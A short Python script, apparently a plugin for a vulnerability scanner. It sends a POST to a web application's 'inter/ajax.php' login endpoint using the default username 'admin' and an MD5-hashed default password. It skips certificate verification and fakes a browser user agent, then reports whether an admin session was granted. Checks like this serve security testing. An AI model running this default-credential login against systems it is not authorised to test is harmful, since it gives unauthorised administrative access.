import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"inter/ajax.php?cmd=get_user_login_cmd"
	body='{"get_user_login_cmd":{"name":"admin","password":"21232f297a57a5a743894a0e4a801fc3"}}'
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "ADMIN" in response.text and "userSession" in response.text:
		r0=True
	else:
		r0=False
	if r0:
		return True
	else:
		return False
